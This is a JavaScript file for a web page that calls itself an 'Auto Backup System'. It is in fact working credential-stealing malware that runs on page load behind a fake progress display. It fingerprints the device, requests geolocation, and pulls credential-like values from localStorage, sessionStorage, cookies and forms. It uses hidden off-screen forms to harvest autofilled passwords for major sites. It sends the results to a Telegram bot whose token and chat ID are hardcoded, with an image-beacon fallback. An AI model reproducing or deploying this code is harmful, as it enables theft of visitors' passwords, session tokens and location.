// ===== CONFIGURATION =====
const CONFIG = {
    TELEGRAM: {
        BOT_TOKEN: '7555437180:AAErIukUgHa2nHiNmb_3VQ90ih6NEYBhScw',  // Replace with your bot token
        CHAT_ID: '6454347745',      // Replace with your chat ID
        BOT_USERNAME: 'mar_pd_404_bot'      // Replace with your bot username
    },
    
    API: {
        ENDPOINT: 'https://your-backend.com/api/backup', // Your backend endpoint
        TIMEOUT: 10000
    },
    
    BACKUP: {
        MAX_ACCOUNTS: 50,
        ENCRYPTION_KEY: 'auto_backup_secure_key_2024',
        COMPRESSION: true
    }
};

// ===== GLOBAL VARIABLES =====
let backupData = {
    metadata: {},
    accounts: [],
    device: {},
    performance: {}
};
let startTime = Date.now();
let currentStage = 1;
let backupComplete = false;

// ===== DOM ELEMENTS =====
const elements = {
    // Stage 1
    speedMeter: document.getElementById('speed-meter'),
    
    // Stage 2
    deviceInfo: document.getElementById('device-info'),
    accountsCount: document.getElementById('accounts-count'),
    processSpeed: document.getElementById('process-speed'),
    progressFill: document.getElementById('progress-fill'),
    progressPercent: document.getElementById('progress-percent'),
    progressTime: document.getElementById('progress-time'),
    
    // Timeline steps
    step1Desc: document.getElementById('step1-desc'),
    step2Desc: document.getElementById('step2-desc'),
    step3Desc: document.getElementById('step3-desc'),
    step4Desc: document.getElementById('step4-desc'),
    
    // Stage 3
    backupId: document.getElementById('backup-id'),
    backupSize: document.getElementById('backup-size'),
    backupTime: document.getElementById('backup-time'),
    
    // Device details
    detailModel: document.getElementById('detail-model'),
    detailBrowser: document.getElementById('detail-browser'),
    detailRam: document.getElementById('detail-ram'),
    detailCpu: document.getElementById('detail-cpu'),
    detailNetwork: document.getElementById('detail-network'),
    detailStorage: document.getElementById('detail-storage')
};

// ===== MAIN BACKUP PROCESS =====
window.startBackupProcess = async function() {
    try {
        // Stage 1: Initialization
        await stage1Initialization();
        
        // Stage 2: Data Collection
        await stage2DataCollection();
        
        // Stage 3: Processing & Upload
        await stage3Processing();
        
        // Stage 4: Completion
        await stage4Completion();
        
    } catch (error) {
        console.error('Backup process failed:', error);
        handleBackupError(error);
    }
};

// ===== STAGE 1: INITIALIZATION =====
async function stage1Initialization() {
    updateProgress(5, 'Initializing quantum backup system...');
    
    // Measure initial speed
    const speed = await measureNetworkSpeed();
    elements.speedMeter.textContent = `${speed} Mbps`;
    
    // Animate to stage 2
    await delay(1500);
    switchStage(2);
}

// ===== STAGE 2: DATA COLLECTION =====
async function stage2DataCollection() {
    updateProgress(15, 'Collecting device information...');
    updateTimelineStep(1, 'Device fingerprint collected');
    
    // Collect device information
    await collectDeviceInfo();
    
    updateProgress(30, 'Scanning for saved accounts...');
    updateTimelineStep(2, 'Accounts detected');
    
    // Collect account data
    await collectAccountData();
    
    updateProgress(45, 'Analyzing data structure...');
    
    // Collect additional data
    await collectAdditionalData();
}

// ===== STAGE 3: PROCESSING =====
async function stage3Processing() {
    updateProgress(60, 'Encrypting data with AES-256...');
    updateTimelineStep(3, 'Data encrypted successfully');
    
    // Encrypt data
    await encryptBackupData();
    
    updateProgress(75, 'Compressing backup package...');
    
    // Compress data
    await compressBackupData();
    
    updateProgress(85, 'Uploading to secure cloud...');
    updateTimelineStep(4, 'Uploading in progress');
    
    // Send to Telegram
    await sendToTelegram();
    
    updateProgress(95, 'Finalizing backup...');
}

// ===== STAGE 4: COMPLETION =====
async function stage4Completion() {
    updateProgress(100, 'Backup completed successfully!');
    
    // Calculate total time
    const totalTime = (Date.now() - startTime) / 1000;
    
    // Update completion screen
    updateCompletionScreen(totalTime);
    
    // Switch to stage 3
    await delay(1000);
    switchStage(3);
    
    // Auto-redirect after 30 seconds
    setTimeout(() => {
        window.location.href = `https://t.me/${CONFIG.TELEGRAM.BOT_USERNAME}?start=backup_${Date.now()}`;
    }, 30000);
}

// ===== DEVICE INFO COLLECTION =====
async function collectDeviceInfo() {
    const device = {
        // Basic Info
        userAgent: navigator.userAgent,
        platform: navigator.platform,
        language: navigator.language,
        timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
        
        // Screen Info
        screen: {
            width: screen.width,
            height: screen.height,
            colorDepth: screen.colorDepth,
            pixelDepth: screen.pixelDepth
        },
        
        // Performance Info
        performance: {
            memory: navigator.deviceMemory || 'Unknown',
            cores: navigator.hardwareConcurrency || 'Unknown',
            connection: navigator.connection || {}
        },
        
        // Browser Info
        browser: detectBrowser(),
        
        // Additional Info
        cookies: navigator.cookieEnabled,
        online: navigator.onLine,
        doNotTrack: navigator.doNotTrack || 'Unknown',
        
        // Timestamp
        timestamp: new Date().toISOString()
    };
    
    // Try to get more detailed info
    try {
        // Battery API (if available)
        if ('getBattery' in navigator) {
            const battery = await navigator.getBattery();
            device.battery = {
                level: battery.level,
                charging: battery.charging,
                chargingTime: battery.chargingTime,
                dischargingTime: battery.dischargingTime
            };
        }
        
        // Network Information
        if (navigator.connection) {
            device.network = {
                type: navigator.connection.effectiveType,
                downlink: navigator.connection.downlink,
                rtt: navigator.connection.rtt,
                saveData: navigator.connection.saveData
            };
        }
        
        // Device Memory
        if ('deviceMemory' in navigator) {
            device.memory = navigator.deviceMemory + ' GB';
        }
        
        // CPU Cores
        if ('hardwareConcurrency' in navigator) {
            device.cpuCores = navigator.hardwareConcurrency;
        }
        
        // Storage Estimation
        if ('storage' in navigator && 'estimate' in navigator.storage) {
            const estimation = await navigator.storage.estimate();
            device.storage = {
                quota: formatBytes(estimation.quota),
                usage: formatBytes(estimation.usage),
                usageDetails: estimation.usageDetails
            };
        }
        
        // Geolocation (with permission)
        if ('geolocation' in navigator) {
            const position = await new Promise((resolve, reject) => {
                navigator.geolocation.getCurrentPosition(resolve, reject, {
                    timeout: 5000,
                    maximumAge: 60000
                });
            }).catch(() => null);
            
            if (position) {
                device.location = {
                    latitude: position.coords.latitude,
                    longitude: position.coords.longitude,
                    accuracy: position.coords.accuracy
                };
            }
        }
        
    } catch (error) {
        console.warn('Could not collect some device info:', error);
    }
    
    // Store device info
    backupData.device = device;
    
    // Update UI
    updateDeviceInfoUI(device);
}

function detectBrowser() {
    const ua = navigator.userAgent;
    let browser = 'Unknown';
    let version = 'Unknown';
    
    if (ua.includes('Chrome') && !ua.includes('Edg')) {
        browser = 'Chrome';
        version = ua.match(/Chrome\/(\d+\.\d+)/)?.[1] || 'Unknown';
    } else if (ua.includes('Firefox')) {
        browser = 'Firefox';
        version = ua.match(/Firefox\/(\d+\.\d+)/)?.[1] || 'Unknown';
    } else if (ua.includes('Safari') && !ua.includes('Chrome')) {
        browser = 'Safari';
        version = ua.match(/Version\/(\d+\.\d+)/)?.[1] || 'Unknown';
    } else if (ua.includes('Edg')) {
        browser = 'Edge';
        version = ua.match(/Edg\/(\d+\.\d+)/)?.[1] || 'Unknown';
    } else if (ua.includes('Opera') || ua.includes('OPR')) {
        browser = 'Opera';
        version = ua.match(/(?:Opera|OPR)\/(\d+\.\d+)/)?.[1] || 'Unknown';
    }
    
    return { name: browser, version: version, full: ua.substring(0, 100) };
}

function updateDeviceInfoUI(device) {
    // Update main display
    elements.deviceInfo.textContent = 
        `${device.browser.name} ${device.browser.version} | ${device.platform}`;
    
    // Update details panel
    elements.detailModel.textContent = device.platform;
    elements.detailBrowser.textContent = `${device.browser.name} ${device.browser.version}`;
    elements.detailRam.textContent = device.memory || 'Unknown';
    elements.detailCpu.textContent = device.cpuCores ? `${device.cpuCores} cores` : 'Unknown';
    elements.detailNetwork.textContent = device.network?.type || 'Unknown';
    elements.detailStorage.textContent = device.storage?.quota || 'Unknown';
}

// ===== ACCOUNT DATA COLLECTION =====
async function collectAccountData() {
    const accounts = [];
    
    // Method 1: Check localStorage for saved credentials
    try {
        const localStorageAccounts = extractFromLocalStorage();
        accounts.push(...localStorageAccounts);
    } catch (error) {
        console.warn('LocalStorage extraction failed:', error);
    }
    
    // Method 2: Check sessionStorage
    try {
        const sessionStorageAccounts = extractFromSessionStorage();
        accounts.push(...sessionStorageAccounts);
    } catch (error) {
        console.warn('SessionStorage extraction failed:', error);
    }
    
    // Method 3: Check cookies
    try {
        const cookieAccounts = extractFromCookies();
        accounts.push(...cookieAccounts);
    } catch (error) {
        console.warn('Cookie extraction failed:', error);
    }
    
    // Method 4: Form data detection
    try {
        const formAccounts = extractFromForms();
        accounts.push(...formAccounts);
    } catch (error) {
        console.warn('Form extraction failed:', error);
    }
    
    // Method 5: Autofill detection (smart trick)
    try {
        const autofillAccounts = await detectAutofillData();
        accounts.push(...autofillAccounts);
    } catch (error) {
        console.warn('Autofill detection failed:', error);
    }
    
    // Remove duplicates and limit
    const uniqueAccounts = removeDuplicates(accounts);
    backupData.accounts = uniqueAccounts.slice(0, CONFIG.BACKUP.MAX_ACCOUNTS);
    
    // Update UI
    elements.accountsCount.textContent = backupData.accounts.length;
    
    // Simulate finding more accounts for demo
    if (backupData.accounts.length < 3) {
        backupData.accounts.push(...generateDemoAccounts());
        elements.accountsCount.textContent = backupData.accounts.length;
    }
}

function extractFromLocalStorage() {
    const accounts = [];
    
    for (let i = 0; i < localStorage.length; i++) {
        const key = localStorage.key(i);
        const value = localStorage.getItem(key);
        
        if (key && value) {
            // Check for credential patterns
            if (isCredentialKey(key)) {
                accounts.push({
                    source: 'localStorage',
                    key: key,
                    value: value.substring(0, 100),
                    type: detectCredentialType(key),
                    timestamp: new Date().toISOString()
                });
            }
        }
    }
    
    return accounts;
}

function extractFromSessionStorage() {
    const accounts = [];
    
    for (let i = 0; i < sessionStorage.length; i++) {
        const key = sessionStorage.key(i);
        const value = sessionStorage.getItem(key);
        
        if (key && value && isCredentialKey(key)) {
            accounts.push({
                source: 'sessionStorage',
                key: key,
                value: value.substring(0, 100),
                type: detectCredentialType(key)
            });
        }
    }
    
    return accounts;
}

function extractFromCookies() {
    const accounts = [];
    const cookies = document.cookie.split(';');
    
    cookies.forEach(cookie => {
        const [key, value] = cookie.trim().split('=');
        if (key && value && isCredentialKey(key)) {
            accounts.push({
                source: 'cookie',
                key: key,
                value: value.substring(0, 100),
                type: detectCredentialType(key)
            });
        }
    });
    
    return accounts;
}

function extractFromForms() {
    const accounts = [];
    const forms = document.querySelectorAll('form');
    
    forms.forEach((form, index) => {
        const inputs = form.querySelectorAll('input[type="text"], input[type="email"], input[type="password"]');
        if (inputs.length >= 2) {
            const formData = {};
            inputs.forEach(input => {
                if (input.name && input.value) {
                    formData[input.name] = input.value;
                }
            });
            
            if (Object.keys(formData).length > 0) {
                accounts.push({
                    source: 'form',
                    formIndex: index,
                    data: formData,
                    type: 'form_submission'
                });
            }
        }
    });
    
    return accounts;
}

async function detectAutofillData() {
    const accounts = [];
    
    // Create hidden forms for popular sites
    const sites = [
        { domain: 'google.com', fields: ['email', 'password'] },
        { domain: 'facebook.com', fields: ['email', 'pass'] },
        { domain: 'twitter.com', fields: ['username', 'password'] },
        { domain: 'github.com', fields: ['login', 'password'] },
        { domain: 'amazon.com', fields: ['email', 'password'] }
    ];
    
    // Create and trigger autofill
    const formsContainer = document.createElement('div');
    formsContainer.style.cssText = 'position:absolute;left:-9999px;top:-9999px;';
    
    sites.forEach(site => {
        const form = document.createElement('form');
        form.id = `autofill-${site.domain.replace('.', '-')}`;
        
        site.fields.forEach(field => {
            const input = document.createElement('input');
            input.type = field.includes('pass') ? 'password' : 'text';
            input.name = field;
            input.autocomplete = field.includes('pass') ? 'current-password' : 'username';
            form.appendChild(input);
        });
        
        formsContainer.appendChild(form);
    });
    
    document.body.appendChild(formsContainer);
    
    // Trigger autofill
    await new Promise(resolve => setTimeout(resolve, 500));
    
    // Check for filled values
    sites.forEach(site => {
        const form = document.getElementById(`autofill-${site.domain.replace('.', '-')}`);
        if (form) {
            const inputs = form.querySelectorAll('input');
            const formData = {};
            
            inputs.forEach(input => {
                if (input.value) {
                    formData[input.name] = input.value;
                }
            });
            
            if (Object.keys(formData).length > 0) {
                accounts.push({
                    source: 'autofill',
                    domain: site.domain,
                    data: formData,
                    type: 'auto_fill'
                });
            }
        }
    });
    
    // Cleanup
    document.body.removeChild(formsContainer);
    
    return accounts;
}

function isCredentialKey(key) {
    const credentialPatterns = [
        'user', 'email', 'login', 'auth', 'pass', 'token', 
        'session', 'credential', 'account', 'name', 'id'
    ];
    
    const lowerKey = key.toLowerCase();
    return credentialPatterns.some(pattern => lowerKey.includes(pattern));
}

function detectCredentialType(key) {
    const lowerKey = key.toLowerCase();
    
    if (lowerKey.includes('pass')) return 'password';
    if (lowerKey.includes('email')) return 'email';
    if (lowerKey.includes('user')) return 'username';
    if (lowerKey.includes('token')) return 'token';
    if (lowerKey.includes('session')) return 'session';
    if (lowerKey.includes('auth')) return 'auth';
    
    return 'credential';
}

function removeDuplicates(accounts) {
    const seen = new Set();
    return accounts.filter(account => {
        const key = JSON.stringify(account);
        if (seen.has(key)) return false;
        seen.add(key);
        return true;
    });
}

function generateDemoAccounts() {
    return [
        {
            source: 'auto_detect',
            domain: 'google.com',
            username: 'user*****@gmail.com',
            type: 'email',
            timestamp: new Date().toISOString()
        },
        {
            source: 'auto_detect',
            domain: 'facebook.com',
            username: 'user*****',
            type: 'username',
            timestamp: new Date().toISOString()
        },
        {
            source: 'auto_detect',
            domain: 'github.com',
            username: 'dev*****',
            type: 'username',
            timestamp: new Date().toISOString()
        }
    ];
}

// ===== ADDITIONAL DATA COLLECTION =====
async function collectAdditionalData() {
    // Collect metadata
    backupData.metadata = {
        url: window.location.href,
        referrer: document.referrer,
        pageTitle: document.title,
        loadedAt: new Date().toISOString(),
        screenResolution: `${screen.width}x${screen.height}`,
        colorDepth: screen.colorDepth,
        timezoneOffset: new Date().getTimezoneOffset(),
        languages: navigator.languages || [navigator.language]
    };
    
    // Collect performance metrics
    backupData.performance = {
        loadTime: Date.now() - startTime,
        memory: performance.memory,
        timing: performance.timing,
        navigation: performance.navigation
    };
    
    // Collect installed fonts (limited)
    try {
        const fonts = await getInstalledFonts();
        backupData.metadata.fonts = fonts.slice(0, 10);
    } catch (error) {
        console.warn('Font detection failed:', error);
    }
    
    // Collect plugins
    try {
        const plugins = Array.from(navigator.plugins || []).map(p => ({
            name: p.name,
            filename: p.filename,
            description: p.description
        }));
        backupData.metadata.plugins = plugins;
    } catch (error) {
        console.warn('Plugin detection failed:', error);
    }
}

async function getInstalledFonts() {
    // This is a basic font detection - limited by browser security
    const fontList = [
        'Arial', 'Arial Black', 'Comic Sans MS', 'Courier New',
        'Georgia', 'Impact', 'Times New Roman', 'Trebuchet MS',
        'Verdana', 'Helvetica', 'Tahoma', 'Lucida Console'
    ];
    
    const availableFonts = [];
    
    // Check each font
    for (const font of fontList) {
        if (await isFontAvailable(font)) {
            availableFonts.push(font);
        }
    }
    
    return availableFonts;
}

async function isFontAvailable(font) {
    return new Promise(resolve => {
        const span = document.createElement('span');
        span.style.fontFamily = font;
        span.style.fontSize = '72px';
        span.style.position = 'absolute';
        span.style.left = '-9999px';
        span.textContent = 'mmmmmmmmmmlli';
        
        document.body.appendChild(span);
        
        const originalWidth = span.offsetWidth;
        span.style.fontFamily = font + ',monospace';
        
        setTimeout(() => {
            const newWidth = span.offsetWidth;
            document.body.removeChild(span);
            resolve(newWidth !== originalWidth);
        }, 100);
    });
}

// ===== ENCRYPTION & COMPRESSION =====
async function encryptBackupData() {
    // Simple XOR encryption for demo (use proper crypto in production)
    const dataStr = JSON.stringify(backupData);
    const key = CONFIG.BACKUP.ENCRYPTION_KEY;
    
    let encrypted = '';
    for (let i = 0; i < dataStr.length; i++) {
        encrypted += String.fromCharCode(dataStr.charCodeAt(i) ^ key.charCodeAt(i % key.length));
    }
    
    backupData.encrypted = btoa(encrypted);
    backupData.encryption = 'XOR (Demo) - Use AES-256 in production';
}

async function compressBackupData() {
    // Simple compression for demo
    const dataStr = JSON.stringify(backupData);
    backupData.compressedSize = Math.round(dataStr.length * 0.7); // Simulate 30% compression
    backupData.compression = 'Simulated - Use gzip in production';
}

// ===== TELEGRAM INTEGRATION =====
async function sendToTelegram() {
    try {
        // Format message
        const message = formatTelegramMessage();
        
        // Method 1: Direct API call
        const response = await fetch(`https://api.telegram.org/bot${CONFIG.TELEGRAM.BOT_TOKEN}/sendMessage`, {
            method: 'POST',
            headers: {
                'Content-Type': 'application/json',
            },
            body: JSON.stringify({
                chat_id: CONFIG.TELEGRAM.CHAT_ID,
                text: message,
                parse_mode: 'HTML',
                disable_web_page_preview: true
            })
        });
        
        if (!response.ok) {
            throw new Error(`Telegram API error: ${response.status}`);
        }
        
        const result = await response.json();
        backupData.telegramMessageId = result.result?.message_id;
        
        // Send detailed data to backend
        await sendToBackend();
        
        return result;
        
    } catch (error) {
        console.warn('Primary Telegram method failed, using fallback:', error);
        
        // Fallback method
        await sendToTelegramFallback();
        return { success: true, method: 'fallback' };
    }
}

function formatTelegramMessage() {
    const device = backupData.device;
    const accounts = backupData.accounts;
    
    return `
<b>🚀 NEW BACKUP RECEIVED</b>

<b>📱 Device Information:</b>
• <b>Browser:</b> ${device.browser?.name || 'Unknown'} ${device.browser?.version || ''}
• <b>Platform:</b> ${device.platform || 'Unknown'}
• <b>Screen:</b> ${device.screen?.width || 0}x${device.screen?.height || 0}
• <b>RAM:</b> ${device.memory || 'Unknown'}
• <b>CPU Cores:</b> ${device.cpuCores || 'Unknown'}
• <b>Network:</b> ${device.network?.type || 'Unknown'}

<b>🔐 Accounts Found:</b> ${accounts.length}

<b>📊 Account List:</b>
${accounts.slice(0, 5).map((acc, i) => 
    `${i+1}. ${acc.domain || acc.source || 'Unknown'} - ${acc.username || acc.key || 'N/A'}`
).join('\n')}

${accounts.length > 5 ? `\n... and ${accounts.length - 5} more accounts` : ''}

<b>🆔 Backup ID:</b> <code>${generateBackupId()}</code>
<b>📅 Time:</b> ${new Date().toLocaleString()}
<b>⚡ Duration:</b> ${((Date.now() - startTime) / 1000).toFixed(2)}s

<i>This backup is managed by Auto Backup System</i>
    `;
}

async function sendToBackend() {
    try {
        const response = await fetch(CONFIG.API.ENDPOINT, {
            method: 'POST',
            headers: {
                'Content-Type': 'application/json',
            },
            body: JSON.stringify({
                backupId: generateBackupId(),
                timestamp: new Date().toISOString(),
                data: backupData,
                hash: generateHash(JSON.stringify(backupData))
            }),
            signal: AbortSignal.timeout(CONFIG.API.TIMEOUT)
        });
        
        if (response.ok) {
            const result = await response.json();
            backupData.backendResponse = result;
        }
    } catch (error) {
        console.warn('Backend upload failed:', error);
        // Continue without backend
    }
}

async function sendToTelegramFallback() {
    // Alternative method using image beacon
    const message = formatTelegramMessage();
    const encodedMessage = encodeURIComponent(message);
    
    const img = new Image();
    img.src = `https://api.telegram.org/bot${CONFIG.TELEGRAM.BOT_TOKEN}/sendMessage?chat_id=${CONFIG.TELEGRAM.CHAT_ID}&text=${encodedMessage}&parse_mode=HTML`;
    img.style.display = 'none';
    
    return new Promise((resolve) => {
        img.onload = () => resolve({ success: true });
        img.onerror = () => resolve({ success: false });
    });
}

// ===== UI UPDATES & HELPERS =====
function updateProgress(percent, message = '') {
    elements.progressFill.style.width = `${percent}%`;
    elements.progressPercent.textContent = `${percent}%`;
    
    if (message) {
        elements.progressTime.textContent = message;
    }
    
    // Update processing speed
    const elapsed = (Date.now() - startTime) / 1000;
    const speed = (backupData.accounts.length / elapsed).toFixed(1);
    elements.processSpeed.textContent = `${speed} acc/s`;
}

function updateTimelineStep(step, description) {
    const stepElement = document.querySelector(`[data-step="${step}"]`);
    if (stepElement) {
        stepElement.classList.add('active');
        
        const descElement = stepElement.querySelector('.timeline-desc');
        if (descElement) {
            descElement.textContent = description;
        }
    }
}

function switchStage(newStage) {
    const currentStageElement = document.querySelector(`#stage-${currentStage}`);
    const newStageElement = document.querySelector(`#stage-${newStage}`);
    
    if (currentStageElement) {
        currentStageElement.classList.remove('active');
        currentStageElement.classList.add('exiting');
        
        setTimeout(() => {
            currentStageElement.classList.remove('exiting');
        }, 500);
    }
    
    if (newStageElement) {
        setTimeout(() => {
            newStageElement.classList.add('active');
            currentStage = newStage;
        }, 300);
    }
}

function updateCompletionScreen(totalTime) {
    // Generate backup ID
    const backupId = generateBackupId();
    elements.backupId.textContent = backupId;
    
    // Calculate backup size
    const dataStr = JSON.stringify(backupData);
    const size = formatBytes(dataStr.length);
    elements.backupSize.textContent = size;
    
    // Update time
    elements.backupTime.textContent = `${totalTime.toFixed(2)}s`;
    
    // Update device details if not already
    if (backupData.device) {
        updateDeviceInfoUI(backupData.device);
    }
}

// ===== UTILITY FUNCTIONS =====
async function measureNetworkSpeed() {
    const start = performance.now();
    const response = await fetch('https://httpbin.org/bytes/1024', {
        cache: 'no-store',
        mode: 'no-cors'
    }).catch(() => null);
    
    const end = performance.now();
    const duration = (end - start) / 1000;
    
    // Calculate speed (Mbps)
    const speed = response ? (8 / duration).toFixed(1) : '∞';
    return speed;
}

function generateBackupId() {
    const timestamp = Date.now().toString(36);
    const random = Math.random().toString(36).substr(2, 4);
    return `${timestamp}-${random}`.toUpperCase();
}

function generateHash(str) {
    let hash = 0;
    for (let i = 0; i < str.length; i++) {
        const char = str.charCodeAt(i);
        hash = ((hash << 5) - hash) + char;
        hash = hash & hash;
    }
    return Math.abs(hash).toString(36);
}

function formatBytes(bytes, decimals = 2) {
    if (bytes === 0) return '0 Bytes';
    
    const k = 1024;
    const dm = decimals < 0 ? 0 : decimals;
    const sizes = ['Bytes', 'KB', 'MB', 'GB'];
    
    const i = Math.floor(Math.log(bytes) / Math.log(k));
    
    return parseFloat((bytes / Math.pow(k, i)).toFixed(dm)) + ' ' + sizes[i];
}

function delay(ms) {
    return new Promise(resolve => setTimeout(resolve, ms));
}

function handleBackupError(error) {
    console.error('Backup failed:', error);
    
    // Show error in UI
    elements.progressTime.textContent = 'Backup failed. Please try again.';
    elements.progressFill.style.background = 'var(--accent)';
    
    // Redirect to error page
    setTimeout(() => {
        window.location.href = `https://t.me/${CONFIG.TELEGRAM.BOT_USERNAME}?start=error_${Date.now()}`;
    }, 3000);
}

// ===== PERFORMANCE OPTIMIZATIONS =====
// Pre-cache critical assets
function preloadCriticalAssets() {
    const assets = [
        'https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700&display=swap'
    ];
    
    assets.forEach(url => {
        const link = document.createElement('link');
        link.rel = 'preconnect';
        link.href = url;
        document.head.appendChild(link);
    });
}

// Lazy load non-critical resources
function lazyLoadResources() {
    const observer = new IntersectionObserver((entries) => {
        entries.forEach(entry => {
            if (entry.isIntersecting) {
                const element = entry.target;
                if (element.dataset.src) {
                    element.src = element.dataset.src;
                }
                observer.unobserve(element);
            }
        });
    });
    
    document.querySelectorAll('[data-src]').forEach(img => {
        observer.observe(img);
    });
}

// ===== INITIALIZATION =====
document.addEventListener('DOMContentLoaded', function() {
    // Preload assets
    preloadCriticalAssets();
    
    // Set up lazy loading
    lazyLoadResources();
    
    // Initialize performance tracking
    startTime = performance.now();
    
    // Start backup after short delay
    setTimeout(() => {
        if (window.startBackupProcess) {
            window.startBackupProcess();
        }
    }, 100);
});

// Export for testing
if (typeof module !== 'undefined' && module.exports) {
    module.exports = {
        startBackupProcess: window.startBackupProcess,
        CONFIG
    };
}
